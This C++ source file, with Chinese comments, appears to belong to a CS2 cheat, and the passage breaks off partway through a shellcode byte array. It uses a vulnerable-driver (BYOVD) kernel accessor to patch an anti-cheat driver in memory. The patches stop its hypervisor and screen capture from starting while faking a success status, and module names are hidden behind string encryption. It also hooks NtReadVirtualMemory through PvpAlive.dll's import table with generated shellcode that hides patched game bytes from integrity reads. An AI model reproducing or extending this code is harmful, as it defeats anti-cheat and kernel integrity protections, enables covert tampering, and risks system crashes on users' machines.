// ★ BUILD 566 v3.225: VmxOnWrapper patch 实现
//
// 设计目标:
//   - PATCH SHV_Install 入口为 mov eax,-5;ret (BUILD 559) 让 SHV 不启动, 但 PAC 可检测 SHV 失败
//   - BUILD 566 改 patch VmxOnWrapper (RVA 0xEAEC4) 为 xor eax,eax;ret (31 C0 C3)
//   - VmxOnWrapper 是 SHV_Install 启动流程的子函数, 调用 vmxon 指令启用 VMX root
//   - patch 后: vmxon 永不执行 → VMX 不启动 → EPT 不构造 → OCR 无画面源
//   - SHV_Install 仍返回 STATUS_SUCCESS (PAC 自检通过, 不触发 ReportVt 上报)
//
// 调用关系 (PAC_SHV 逆向分析报告 §3.2-3.3):
//   SHV_Install (0xEA408)
//     → (7) BroadcastToAllCpus (0xEADC4) + WaitForCompletion (0xEAE4D)
//       → 在每 CPU 上执行 g_shvLaunchFn
//         → VmxOnWrapper (0xEAEC4)
//           → vmxon 指令 (0F 01 C1) ← ★ patch 此函数让其永不执行
//           → ret
//
// 安全性:
//   - VmxOnWrapper patch 在内核态 (与 SHV_Install patch 一致), 不触发 PatchGuard
//   - vmxon 永不执行 → 不进入 VMX root operation → 无硬件状态变化 → BSOD 风险极低
//   - 失败回退: VmxOnWrapper patch 失败时, PatchShvInstallEntry 仍执行 SHV_Install patch
//   - 失败不计入降级模式 (与 SHV_Install patch 独立, 避免 RVA 失效连锁影响)
// ============================================================

uint64_t ShvInstallPatcher::FindVmxOnWrapperEntry(uint64_t pacModuleBase) {
    if (!pacModuleBase) return 0;

    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return 0;

    // 1. 计算 VmxOnWrapper 绝对 VA = pacModuleBase + RVA 0xEAEC4
    uint64_t vmxOnAddr = pacModuleBase + VMXON_WRAPPER_RVA;

    // 2. 读取前 32 字节用于 vmxon 指令验证
    uint8_t buf[VMXON_VERIFY_RANGE] = {};
    if (!kma.ReadKernelVA(vmxOnAddr, buf, VMXON_VERIFY_RANGE)) {
        ByovdDiag("BYOVD:VmxOn: failed to read @ 0x%llX\n",
            (unsigned long long)vmxOnAddr);
        return 0;
    }

    // 3. 验证: 前 32 字节内应包含 vmxon 指令 (0F 01 C1)
    //    VmxOnWrapper 序言 (AND/MOV/SHL/OR) + vmxon 指令 ≈ 15-20 字节, 32 字节足够覆盖
    bool foundVmxon = false;
    for (uint32_t i = 0; i + 3 <= VMXON_VERIFY_RANGE; i++) {
        if (buf[i] == VMXON_INSTR_BYTES[0] &&
            buf[i + 1] == VMXON_INSTR_BYTES[1] &&
            buf[i + 2] == VMXON_INSTR_BYTES[2]) {
            foundVmxon = true;
            break;
        }
    }
    if (!foundVmxon) {
        ByovdDiag("BYOVD:VmxOn: vmxon instruction not found in first %u bytes @ 0x%llX (RVA mismatch?)\n",
            (unsigned)VMXON_VERIFY_RANGE, (unsigned long long)vmxOnAddr);
        return 0;
    }

    // 4. 验证: 第一个字节不应是 0xCC/0x00/0x90 (函数边界)
    //    VmxOnWrapper 应以 AND RCX, ... (48 83 E1 FF 或类似) 开头 (报告 §3.3)
    uint8_t first = buf[0];
    if (first == 0x00 || first == 0xCC || first == 0x90) {
        ByovdDiag("BYOVD:VmxOn: suspicious first byte 0x%02X @ 0x%llX (function boundary?)\n",
            first, (unsigned long long)vmxOnAddr);
        return 0;
    }

    return vmxOnAddr;
}

bool ShvInstallPatcher::PatchVmxOnWrapper() {
    // 防御性: 若已 patch, 直接返回成功
    if (IsVmxOnPatched()) {
        ByovdDiag("BYOVD:VmxOn: already patched @ 0x%llX\n",
            (unsigned long long)m_vmxOnPatchedAddress);
        return true;
    }

    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) {
        ByovdDiag("BYOVD:VmxOn: KMA not active\n");
        return false;
    }

    // 1. 定位 PAC 驱动基址 (与 PatchShvInstallEntry 一致的字符串加密模式)
    char pacDriverName[32] = {};
    STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", pacDriverName, sizeof(pacDriverName));
    uint64_t pacBase = kma.GetKernelModuleBase(pacDriverName);
    SecureZeroMemory(pacDriverName, sizeof(pacDriverName));
    if (!pacBase) {
        // PAC 未加载不算失败 (与 PatchShvInstallEntry BUILD 561 一致)
        ByovdDiag("BYOVD:VmxOn: PAC driver not loaded\n");
        return false;
    }

    // 2. 通过 RVA + 字节验证定位 VmxOnWrapper
    uint64_t vmxOnAddr = FindVmxOnWrapperEntry(pacBase);
    if (!vmxOnAddr) {
        ByovdDiag("BYOVD:VmxOn: VmxOnWrapper not found (RVA mismatch or vmxon instr missing)\n");
        return false;
    }
    ByovdDiag("BYOVD:VmxOn: VmxOnWrapper @ 0x%llX\n", (unsigned long long)vmxOnAddr);

    // 3. 读取原始 3 字节
    // ★ BUILD 567 v3.227: 记录是否为重 patch (m_vmxOnPatchedAddress 之前是否非零)
    //   用于区分 STATE:VMXON:PATCHED (首次) vs STATE:VMXON:REPATCHED (PAC 恢复后重 patch)
    bool wasPatchedBefore = (m_vmxOnPatchedAddress != 0);
    if (!kma.ReadKernelVA(vmxOnAddr, m_vmxOnOriginalBytes, 3)) {
        ByovdDiag("BYOVD:VmxOn: failed to read original bytes @ 0x%llX\n",
            (unsigned long long)vmxOnAddr);
        return false;
    }
    m_hasVmxOnOriginalBytes = true;
    m_vmxOnPatchedAddress = vmxOnAddr;

    // 4. 安全检查: 验证原始字节不是已 patch 状态或填充
    //    已 patch: 31 C0 C3 (xor eax,eax; ret)
    if (m_vmxOnOriginalBytes[0] == VMXON_PATCH_BYTES[0] &&
        m_vmxOnOriginalBytes[1] == VMXON_PATCH_BYTES[1] &&
        m_vmxOnOriginalBytes[2] == VMXON_PATCH_BYTES[2]) {
        // 已是 patch 状态 (IsVmxOnPatched 应已捕获, 双重保险)
        ByovdDiag("BYOVD:VmxOn: already patched (byte-level check)\n");
        return true;
    }
    // 函数边界检查: 第一个字节不应是 0x00/0xCC/0x90
    if (m_vmxOnOriginalBytes[0] == 0x00 ||
        m_vmxOnOriginalBytes[0] == 0xCC ||
        m_vmxOnOriginalBytes[0] == 0x90) {
        ByovdDiag("BYOVD:VmxOn: suspicious original bytes (first=0x%02X), abort\n",
            m_vmxOnOriginalBytes[0]);
        m_hasVmxOnOriginalBytes = false;
        m_vmxOnPatchedAddress = 0;
        return false;
    }

    // 5. 写入 patch: 31 C0 C3 (xor eax,eax; ret)
    if (!kma.WriteKernelVA(vmxOnAddr, VMXON_PATCH_BYTES, 3)) {
        ByovdDiag("BYOVD:VmxOn: WriteKernelVA FAILED @ 0x%llX\n",
            (unsigned long long)vmxOnAddr);
        m_hasVmxOnOriginalBytes = false;
        m_vmxOnPatchedAddress = 0;
        return false;
    }

    // 6. 读回验证
    uint8_t verify[3] = {};
    if (!kma.ReadKernelVA(vmxOnAddr, verify, 3)) {
        ByovdDiag("BYOVD:VmxOn: verify read FAILED\n");
        return false;
    }
    for (int i = 0; i < 3; i++) {
        if (verify[i] != VMXON_PATCH_BYTES[i]) {
            ByovdDiag("BYOVD:VmxOn: verify MISMATCH @ byte %d (got 0x%02X, want 0x%02X)\n",
                i, verify[i], VMXON_PATCH_BYTES[i]);
            return false;
        }
    }

    ByovdDiag("BYOVD:VmxOn: SUCCESS — VmxOnWrapper patched @ 0x%llX (xor eax,eax; ret — VMX 永不启动)\n",
        (unsigned long long)vmxOnAddr);
    // ★ BUILD 567 v3.227: 状态变化日志 + 计数器更新
    //   首次 patch: STATE:VMXON:PATCHED, 重 patch: STATE:VMXON:REPATCHED
    g_logStats.vmxOnPatchSuccess++;
    if (wasPatchedBefore) g_logStats.vmxOnRepatch++;
    StateLog("VMXON", wasPatchedBefore ? "REPATCHED" : "PATCHED",
        "addr=0x%llx tick=%u", (unsigned long long)vmxOnAddr, (unsigned)GetTickCount());
    return true;
}

bool ShvInstallPatcher::IsVmxOnPatched() {
    if (!m_vmxOnPatchedAddress) return false;

    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return false;

    uint8_t current[3] = {};
    if (!kma.ReadKernelVA(m_vmxOnPatchedAddress, current, 3)) return false;

    for (int i = 0; i < 3; i++) {
        if (current[i] != VMXON_PATCH_BYTES[i]) return false;
    }
    return true;
}

bool ShvInstallPatcher::PatchShvInstallEntry() {
    // ★ BUILD 566 v3.225: 优先 patch VmxOnWrapper (隐蔽性更高 — SHV_Install 仍返回 STATUS_SUCCESS)
    //   VmxOnWrapper patch 成功 → VMX 永不启动 → EPT 永不构造 → OCR 无画面源
    //   VmxOnWrapper patch 失败 → 回退到 SHV_Install patch (现有逻辑)
    //   无论 VmxOnWrapper patch 成功与否, 都继续 patch SHV_Install (双重保险)
    // ★ BUILD 566 加固 v3.226: VmxOnWrapper patch 失败/成功计入独立降级计数
    //   语义与 SHV_Install patch 完全对称:
    //   - 已 patched (IsVmxOnPatched==true) 快速返回, 不计成功也不计失败 (不更新计数)
    //     与 SHV_Install patch 入口 IsPatched() 快速返回语义一致 (L8381-8383)
    //   - 未 patched 调用 PatchVmxOnWrapper, 成功计 success / 失败计 failure
    //   - 失败 ≥3 次进入 VmxOnWrapper 降级模式 (与 SHV_Install 降级独立)
    //   - 5 分钟自恢复 (与 SHV_Install 一致)
    //   IOCTL 开销: 已 patched 时仅 1 次 ReadKernelVA (IsVmxOnPatched), 与 PatchVmxOnWrapper 内部
    //   IsVmxOnPatched 快速返回的开销相同, 无额外负担.
    // ★ BUG 修复 (第 3 轮审查): VmxOn 降级模式下必须跳过 PatchVmxOnWrapper, 否则
    //   needShvRepatch=true 触发 PatchShvInstallEntry 时, PatchVmxOnWrapper 失败会持续
    //   更新 m_vmxOnLastPatchTick, 导致 5 分钟自恢复永远无法触发.
    //   降级模式下 vmxOnOk=false (不更新计数), 5 分钟后 IsVmxOnDegradedMode() 自恢复返回 false,
    //   下次 PatchShvInstallEntry 调用时重新尝试 PatchVmxOnWrapper.
    bool vmxOnOk;
    if (IsVmxOnDegradedMode()) {
        // VmxOn 降级模式: 跳过 PatchVmxOnWrapper (避免失败计数累积 + m_vmxOnLastPatchTick 误更新)
        // 5 分钟自恢复后 IsVmxOnDegradedMode() 返回 false, 自动恢复 patch 尝试
        vmxOnOk = false;
    } else if (IsVmxOnPatched()) {
        // 已 patched, 快速返回 (不计入降级计数, 避免 m_vmxOnLastPatchTick 被无意义更新)
        vmxOnOk = true;
    } else {
        vmxOnOk = PatchVmxOnWrapper();
        if (vmxOnOk) {
            RecordVmxOnPatchSuccess();
        } else {
            RecordVmxOnPatchFailure();
        }
    }
    ByovdDiag("BYOVD:ShvPatch: VmxOnWrapper patch %s (continuing to SHV_Install patch)\n",
        vmxOnOk ? "SUCCESS" : "FAILED");

    // 防御性: 若已 patch, 直接返回成功
    //   ★ BUILD 555 P2-1: 已 patched 状态不更新失败/成功计数
    //     (IsPatched()=true 时快速返回, 不算新的 patch 尝试, 避免无意义的状态变化)
    if (IsPatched()) {
        ByovdDiag("BYOVD:ShvPatch: already patched @ 0x%llX\n",
            (unsigned long long)m_patchedAddress);
        return true;
    }

    // ★ BUILD 555 P2-1: 在入口记录 m_lastPatchTick (无论成功失败都更新, 用于降级自恢复判定)
    m_lastPatchTick = GetTickCount();

    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) {
        ByovdDiag("BYOVD:ShvPatch: KMA not active\n");
        RecordPatchFailure();
        return false;
    }

    // 1. 定位 PAC 驱动 (MessageTransfer.sys) 内核基址
    //    ★ BUILD 552: 用 STEALTH_STR_DECRYPT_TO 解密模块名, 避免明文进入 .rdata
    //      (与 byovd_kernel.cpp L4155/L6496/L6555 保持一致)
    char pacDriverName[32] = {};
    STEALTH_STR_DECRYPT_TO("MessageTransfer.sys", pacDriverName, sizeof(pacDriverName));
    uint64_t pacBase = kma.GetKernelModuleBase(pacDriverName);
    if (!pacBase) {
        // ★ BUILD 561: PAC 未加载时不计入失败次数 (避免误触发降级模式)
        //   原因: PAC 未加载是正常状态 (CS2 未启动 / PAC 临时卸载 / 系统启动早期),
        //         不是 patch 机制本身的失败. 原 BUILD 555 逻辑将其计入 m_consecutiveFailures,
        //         连续 3 次 (即 ~90-135s 周期) 后误进入降级模式, 导致 SHV patch 长期失效.
        //   修改: 仅更新 m_lastPatchTick (用于降级自恢复判定), 不调用 RecordPatchFailure()
        //   副作用: 真正的 patch 失败 (PAC 加载但特征码未匹配/写入失败) 仍会触发降级模式
        ByovdDiag("BYOVD:ShvPatch: PAC driver not loaded (not counted as failure)\n");
        m_lastPatchTick = GetTickCount();
        return false;
    }
    ByovdDiag("BYOVD:ShvPatch: PAC driver base = 0x%llX\n", (unsigned long long)pacBase);

    // 2. 读取 PE 头获取 .text 段大小和 RVA
    //    PE 头位于 pacBase + e_lfanew
    uint32_t e_lfanew = kma.Read<uint32_t>(pacBase + 0x3C);
    if (e_lfanew == 0 || e_lfanew > 0x1000) {
        ByovdDiag("BYOVD:ShvPatch: invalid e_lfanew=0x%X\n", e_lfanew);
        RecordPatchFailure();
        return false;
    }
    uint64_t ntHeaders = pacBase + e_lfanew;

    // IMAGE_NT_HEADERS64: Signature(4) + FileHeader(20) + OptionalHeader(240)
    //   OptionalHeader.SizeOfImage @ offset 0x38 (from ntHeaders start)
    //   NumberOfSections @ FileHeader offset 0x6 (from ntHeaders start)
    uint16_t numSections = kma.Read<uint16_t>(ntHeaders + 0x6);
    uint16_t sizeOfOptionalHeader = kma.Read<uint16_t>(ntHeaders + 0x14);
    if (numSections == 0 || numSections > 64) {
        ByovdDiag("BYOVD:ShvPatch: invalid numSections=%u\n", numSections);
        RecordPatchFailure();
        return false;
    }

    // 节表起始: ntHeaders + 0x18 + sizeOfOptionalHeader
    uint64_t sectionTable = ntHeaders + 0x18 + sizeOfOptionalHeader;

    // 遍历节表查找 .text (VirtualAddress + VirtualSize)
    uint32_t textRVA = 0;
    uint32_t textSize = 0;
    for (uint16_t i = 0; i < numSections; i++) {
        uint64_t section = sectionTable + i * 40;  // IMAGE_SECTION_HEADER = 40 字节
        char name[9] = {};
        for (int j = 0; j < 8; j++) {
            name[j] = (char)kma.Read<uint8_t>(section + j);
        }
        if (name[0] == '.' && name[1] == 't' && name[2] == 'e' && name[3] == 'x' && name[4] == 't') {
            textRVA = kma.Read<uint32_t>(section + 12);   // VirtualAddress
            textSize = kma.Read<uint32_t>(section + 8);   // VirtualSize
            break;
        }
    }
    if (!textRVA || !textSize) {
        ByovdDiag("BYOVD:ShvPatch: .text section not found\n");
        RecordPatchFailure();
        return false;
    }
    ByovdDiag("BYOVD:ShvPatch: .text RVA=0x%X size=0x%X\n", textRVA, textSize);

    // 3. 特征码扫描定位 SHV_Install 入口
    //    ★ BUILD 562: 传入 pacBase (模块基址) 用于 SIG2 目标地址验证
    //      SIG1 仅需 .text 段地址, SIG2 需要 pacBase + RVA 计算目标地址
    uint64_t shvInstallAddr = FindShvInstallEntry(pacBase, pacBase + textRVA, textSize);
    if (!shvInstallAddr) {
        ByovdDiag("BYOVD:ShvPatch: SHV_Install entry not found via signature scan\n");
        RecordPatchFailure();
        return false;
    }
    ByovdDiag("BYOVD:ShvPatch: SHV_Install entry @ 0x%llX\n", (unsigned long long)shvInstallAddr);

    // 4. 读取原始 6 字节 (用于 Restore)
    // ★ BUILD 567 v3.227: 记录是否为重 patch (m_patchedAddress 之前是否非零)
    //   用于区分 STATE:SHV:PATCHED (首次) vs STATE:SHV:REPATCHED (PAC 恢复后重 patch)
    bool wasShvPatchedBefore = (m_patchedAddress != 0);
    if (!kma.ReadKernelVA(shvInstallAddr, m_originalBytes, 6)) {
        ByovdDiag("BYOVD:ShvPatch: failed to read original bytes @ 0x%llX\n",
            (unsigned long long)shvInstallAddr);
        RecordPatchFailure();
        return false;
    }
    m_hasOriginalBytes = true;
    m_patchedAddress = shvInstallAddr;

    // ★ 安全检查: 验证原始字节是合法的函数序言 (不能是 0xCC/0x90 填充或 0)
    //   合法序言通常以 REX prefix (0x40-0x4F) 或 push/mov 指令开头
    uint8_t first = m_originalBytes[0];
    if (first == 0x00 || first == 0xCC || first == 0x90) {
        ByovdDiag("BYOVD:ShvPatch: suspicious original bytes (first=0x%02X), abort\n", first);
        m_hasOriginalBytes = false;
        m_patchedAddress = 0;
        RecordPatchFailure();
        return false;
    }

    // 5. 写入 patch: B8 FC FF FF FF C3 (mov eax, -4; ret)
    if (!kma.WriteKernelVA(shvInstallAddr, PATCH_BYTES, 6)) {
        ByovdDiag("BYOVD:ShvPatch: WriteKernelVA FAILED @ 0x%llX\n",
            (unsigned long long)shvInstallAddr);
        m_hasOriginalBytes = false;
        m_patchedAddress = 0;
        RecordPatchFailure();
        return false;
    }

    // 6. 读回验证
    uint8_t verify[6] = {};
    if (!kma.ReadKernelVA(shvInstallAddr, verify, 6)) {
        ByovdDiag("BYOVD:ShvPatch: verify read FAILED\n");
        RecordPatchFailure();
        return false;
    }
    for (int i = 0; i < 6; i++) {
        if (verify[i] != PATCH_BYTES[i]) {
            ByovdDiag("BYOVD:ShvPatch: verify MISMATCH @ byte %d (got 0x%02X, want 0x%02X)\n",
                i, verify[i], PATCH_BYTES[i]);
            RecordPatchFailure();
            return false;
        }
    }

    ByovdDiag("BYOVD:ShvPatch: SUCCESS — SHV_Install patched @ 0x%llX (mov eax,-5; ret — 物理内存超限伪装)\n",
        (unsigned long long)shvInstallAddr);
    // ★ BUILD 555 P2-1: 成功 patch — 重置失败计数, 退出降级模式
    RecordPatchSuccess();
    // ★ BUILD 567 v3.227: 状态变化日志 + 计数器更新
    //   首次 patch: STATE:SHV:PATCHED, 重 patch: STATE:SHV:REPATCHED
    g_logStats.shvPatchSuccess++;
    if (wasShvPatchedBefore) g_logStats.shvRepatch++;
    StateLog("SHV", wasShvPatchedBefore ? "REPATCHED" : "PATCHED",
        "addr=0x%llx tick=%u", (unsigned long long)shvInstallAddr, (unsigned)GetTickCount());
    return true;
}

bool ShvInstallPatcher::IsPatched() {
    if (!m_patchedAddress) return false;

    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return false;

    uint8_t current[6] = {};
    if (!kma.ReadKernelVA(m_patchedAddress, current, 6)) return false;

    for (int i = 0; i < 6; i++) {
        if (current[i] != PATCH_BYTES[i]) return false;
    }
    return true;
}

bool ShvInstallPatcher::RestoreShvInstallEntry() {
    if (!m_hasOriginalBytes || !m_patchedAddress) {
        ByovdDiag("BYOVD:ShvPatch: cannot restore — no original bytes cached\n");
        return false;
    }

    KernelMemoryAccessor& kma = KernelMemoryAccessor::Instance();
    if (!kma.IsActive()) return false;

    if (!kma.WriteKernelVA(m_patchedAddress, m_originalBytes, 6)) {
        ByovdDiag("BYOVD:ShvPatch: restore WriteKernelVA FAILED\n");
        return false;
    }

    ByovdDiag("BYOVD:ShvPatch: restored original bytes @ 0x%llX\n",
        (unsigned long long)m_patchedAddress);
    m_hasOriginalBytes = false;
    m_patchedAddress = 0;
    return true;
}

// ============================================================
// ★ BUILD 565 v3.224: NtReadHooker 实现
//   Hook NtReadVirtualMemory 双重保险 (B: IAT hook PvpAlive + A: inline hook ntdll)
//   过滤逻辑: post-read patching — 仅过滤 patch 区域 [clientBase+0xC125D9, +0xC125DB)
// ============================================================

uintptr_t NtReadHooker::FindPvpAliveBase(HANDLE cs2Process) {
    if (!cs2Process) return 0;

    // 跨进程枚举 CS2 模块 (NtQueryInformationProcess + PEB.Ldr)
    stealth::StealthProcess::ModuleInfo modules[256];
    int modCount = stealth::StealthProcess::GetProcessModules(cs2Process, modules, 256);
    if (modCount <= 0) return 0;

    // 解密 "PvpAlive.dll" 用于比较 (避免明文进入 .rdata)
    wchar_t pvpAliveW[32] = {};
    STEALTH_WSTR_DECRYPT_TO("PvpAlive.dll", pvpAliveW, (int)(sizeof(pvpAliveW) / sizeof(wchar_t)));

    uintptr_t result = 0;
    for (int i = 0; i < modCount; i++) {
        if (_wcsicmp(modules[i].name, pvpAliveW) == 0) {
            result = modules[i].baseAddress;
            break;
        }
    }

    SecureZeroMemory(pvpAliveW, sizeof(pvpAliveW));
    return result;
}

uintptr_t NtReadHooker::FindNtReadInIAT(HANDLE cs2Process, uintptr_t pvpAliveBase,
                                         uintptr_t* out_originalNtRead) {
    if (!cs2Process || !pvpAliveBase || !out_originalNtRead) return 0;
    *out_originalNtRead = 0;

    // 读 DOS 头
    IMAGE_DOS_HEADER dosHdr = {};
    if (!stealth::StealthMemory::Read(cs2Process, pvpAliveBase, &dosHdr, sizeof(dosHdr)))
        return 0;
    if (dosHdr.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    // 读 NT 头 (PE32+)
    IMAGE_NT_HEADERS64 ntHdr = {};
    if (!stealth::StealthMemory::Read(cs2Process, pvpAliveBase + dosHdr.e_lfanew,
                                       &ntHdr, sizeof(ntHdr)))
        return 0;
    if (ntHdr.Signature != IMAGE_NT_SIGNATURE) return 0;

    // Import Directory
    IMAGE_DATA_DIRECTORY importDir =
        ntHdr.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!importDir.VirtualAddress || !importDir.Size) return 0;

    uintptr_t importDescAddr = pvpAliveBase + importDir.VirtualAddress;

    // 解密 "ntdll.dll" / "NtReadVirtualMemory" 用于比较
    char ntdllA[32] = {};
    char ntReadA[64] = {};
    STEALTH_STR_DECRYPT_TO("ntdll.dll", ntdllA, (int)sizeof(ntdllA));
    STEALTH_STR_DECRYPT_TO("NtReadVirtualMemory", ntReadA, (int)sizeof(ntReadA));

    uintptr_t iatEntryAddr = 0;

    // 遍历 IMPORT_DESCRIPTOR 数组 (每个 20 字节, 以全零终止)
    for (DWORD idx = 0; idx < 4096; idx++) {
        IMAGE_IMPORT_DESCRIPTOR desc = {};
        uintptr_t curAddr = importDescAddr + idx * sizeof(IMAGE_IMPORT_DESCRIPTOR);
        if (!stealth::StealthMemory::Read(cs2Process, curAddr, &desc, sizeof(desc)))
            break;
        if (!desc.Name && !desc.FirstThunk) break;  // 终止符

        // 读取 DLL 名
        char dllName[64] = {};
        if (desc.Name) {
            stealth::StealthMemory::Read(cs2Process, pvpAliveBase + desc.Name,
                                          dllName, sizeof(dllName) - 1);
        }
        if (_stricmp(dllName, ntdllA) != 0) continue;

        // INT (OriginalFirstThunk) 用于读函数名, IAT (FirstThunk) 是实际地址
        uintptr_t intAddr = desc.OriginalFirstThunk
                            ? pvpAliveBase + desc.OriginalFirstThunk
                            : pvpAliveBase + desc.FirstThunk;
        uintptr_t iatAddr = pvpAliveBase + desc.FirstThunk;

        for (DWORD thunkIdx = 0; thunkIdx < 65536; thunkIdx++) {
            uint64_t intEntry = 0;
            if (!stealth::StealthMemory::Read(cs2Process,
                                               intAddr + thunkIdx * sizeof(uint64_t),
                                               &intEntry, sizeof(intEntry)))
                break;
            if (!intEntry) break;  // 终止

            // 按序号导入跳过
            if (intEntry & 0x8000000000000000ULL) continue;

            // 读取函数名 (IMAGE_IMPORT_BY_NAME: 2 字节 hint + 名字)
            char funcName[128] = {};
            stealth::StealthMemory::Read(cs2Process,
                                          pvpAliveBase + (intEntry & 0x7FFFFFFFFFFFFFFFULL),
                                          funcName, sizeof(funcName) - 1);
            // 跳过 2 字节 hint
            char* funcNameStr = funcName + 2;
            if (_stricmp(funcNameStr, ntReadA) == 0) {
                iatEntryAddr = iatAddr + thunkIdx * sizeof(uint64_t);
                // 读取 IAT 当前值 (= ntdll!NtReadVirtualMemory 实际地址)
                uint64_t iatValue = 0;
                stealth::StealthMemory::Read(cs2Process, iatEntryAddr,
                                              &iatValue, sizeof(iatValue));
                *out_originalNtRead = (uintptr_t)iatValue;
                break;
            }
        }
        if (iatEntryAddr) break;
    }

    SecureZeroMemory(ntdllA, sizeof(ntdllA));
    SecureZeroMemory(ntReadA, sizeof(ntReadA));
    return iatEntryAddr;
}

bool NtReadHooker::GenerateFilterShellcode(uint8_t* outBuf, size_t* outSize,
                                            uintptr_t originalNtRead,
                                            uintptr_t patchAddr,
                                            uint16_t patchSize,
                                            const uint8_t* patchData) {
    if (!outBuf || !outSize) return false;

    // ★ BUILD 566: 参数化 patchSize + patchData, 为未来多 patch 点扩展预留接口
    //   当前仅支持 patchSize = 2 (mov word ptr [r8], imm16)
    //   未来扩展: patchSize = 4 (mov dword ptr) / patchSize = 8 (mov qword ptr)
    //   shellcode 大小不变 (仍 104 字节), static_assert 通过
    if (patchSize != 2) {
        ByovdDiag("BYOVD:NtRead: unsupported patchSize=%u (only 2 supported)\n", patchSize);
        return false;
    }

    // 从 patchData 提取 2 字节 imm16 (小端)
    //   默认 32 c0 (原始字节, BUILD 565 行为)
    //   BUILD 566: 支持调用方传入自定义 patchData
    uint16_t patchWord = 0;
    if (patchData) {
        patchWord = (uint16_t)patchData[0] | ((uint16_t)patchData[1] << 8);
    } else {
        patchWord = 0xC032;  // 默认 32 c0 (小端 0xC032)
    }

    // ★ BUILD 565: 过滤函数 shellcode (PIC, 104 字节)
    //   调用原 NtReadVirtualMemory, 若成功且读取范围与 patch 区域重叠,
    //   在 Buffer 中恢复 patch 字节 (BUILD 566: 由 patchWord 参数化), 返回原 status.
    //   内嵌常量: originalNtRead @ 偏移 0x16, patchAddr @ 偏移 0x35, patchWord @ 偏移 0x5D
    //
    // ★ BUILD 567 v3.258 FIX: 严格边界检查 — 修复缓冲区溢出导致的 CS2 崩溃
    //   原Bug: 当 BaseAddress = patchAddr+1 时 offset=-1, 写入 [Buffer-1] 前溢出;
    //          当 NumberOfBytesToRead=1 且 BaseAddress=patchAddr 时, 写入 2 字节但 Buffer 只 1 字节, 后溢出.
    //   修复: 改为严格边界检查:
    //     - BaseAddress > patchAddr → 跳过 (确保 offset >= 0)
    //     - patchEnd > readEnd → 跳过 (确保 offset + 2 <= NumberOfBytesToRead)
    //   字节变化: [0x41] cmp rdx,rcx → cmp rdx,rax; [0x44] jae → ja;
    //             [0x46] cmp rax,r9 → cmp rcx,r9; [0x49] jae → ja
    static const uint8_t kTemplate[] = {
        // [0x00] push rbp; mov rbp, rsp; sub rsp, 0x40
        0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x40,
        // [0x08] mov [rbp-0x08], rdx  (BaseAddress)
        0x48, 0x89, 0x55, 0xF8,
        // [0x0C] mov [rbp-0x10], r8   (Buffer)
        0x4C, 0x89, 0x45, 0xF0,
        // [0x10] mov [rbp-0x18], r9   (NumberOfBytesToRead)
        0x4C, 0x89, 0x4D, 0xE8,
        // [0x14] mov rax, originalNtRead (10 字节, 常量在 +2 = 0x16)
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        // [0x1E] call rax
        0xFF, 0xD0,
        // [0x20] mov [rbp-0x20], eax  (status)
        0x89, 0x45, 0xE0,
        // [0x23] test eax, eax
        0x85, 0xC0,
        // [0x25] jne .return (+0x38 → 0x5F)
        0x75, 0x38,
        // [0x27] mov rdx, [rbp-0x08]  (BaseAddress)
        0x48, 0x8B, 0x55, 0xF8,
        // [0x2B] mov r9, [rbp-0x18]   (NumberOfBytesToRead)
        0x4C, 0x8B, 0x4D, 0xE8,
        // [0x2F] lea r9, [rdx + r9]   (readEnd = BaseAddress + NumberOfBytesToRead)
        //   ★ BUILD 565 FIX-1: REX 字节 0x4C → 0x4E (REX.X=1 才能让 index=r9)
        //   原错误: 4C 8D 0C 0A = lea r9, [rdx + rdx] (index=rdx, 计算 2*BaseAddress)
        //   修复后: 4E 8D 0C 0A = lea r9, [rdx + r9]  (index=r9,  计算 BaseAddress + NumberOfBytesToRead)
        0x4E, 0x8D, 0x0C, 0x0A,
        // [0x33] mov rax, patchAddr (10 字节, 常量在 +2 = 0x35)
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        // [0x3D] lea rcx, [rax + 2]   (patchEnd = patchAddr + 2)
        0x48, 0x8D, 0x48, 0x02,
        // [0x41] cmp rdx, rax         (BaseAddress vs patchAddr)
        //   ★ v3.258 FIX: 原 cmp rdx, rcx (vs patchEnd) → cmp rdx, rax (vs patchAddr)
        //   原因: 确保 offset = patchAddr - BaseAddress >= 0, 防止 BaseAddress > patchAddr 时
        //         offset 变成负数 (0xFFFFFFFFFFFFFFFF) 导致 r8 = Buffer + offset 写入缓冲区前
        0x48, 0x39, 0xC2,
        // [0x44] ja .return (+0x19 → 0x5F)
        //   ★ v3.258 FIX: 原 jae (>=) → ja (>) 允许 BaseAddress == patchAddr (offset=0)
        //   原因: BaseAddress == patchAddr 时 offset=0 是合法的, 不应跳过
        0x77, 0x19,
        // [0x46] cmp rcx, r9          (patchEnd vs readEnd)
        //   ★ v3.258 FIX: 原 cmp rax, r9 (patchAddr vs readEnd) → cmp rcx, r9 (patchEnd vs readEnd)
        //   原因: 确保 patchEnd <= readEnd (即 offset + 2 <= NumberOfBytesToRead),
        //         防止 NumberOfBytesToRead < 2 时写入超过 Buffer 边界
        0x4C, 0x39, 0xC9,
        // [0x49] ja .return (+0x14 → 0x5F)
        //   ★ v3.258 FIX: 原 jae (>=) → ja (>) 允许 patchEnd == readEnd (刚好读完 2 字节)
        //   原因: patchEnd == readEnd 时 offset + 2 == NumberOfBytesToRead, 刚好不溢出
        0x77, 0x14,
        // [0x4B] mov rdx, [rbp-0x08]  (BaseAddress)
        0x48, 0x8B, 0x55, 0xF8,
        // [0x4F] sub rax, rdx         (offset = patchAddr - BaseAddress)
        0x48, 0x29, 0xD0,
        // [0x52] mov r8, [rbp-0x10]   (Buffer)
        0x4C, 0x8B, 0x45, 0xF0,
        // [0x56] add r8, rax          (Buffer + offset)
        //   ★ BUILD 565 FIX-2: REX 字节 0x4C → 0x49 (REX.R=0 + REX.B=1 才能让目标=r8, 源=rax)
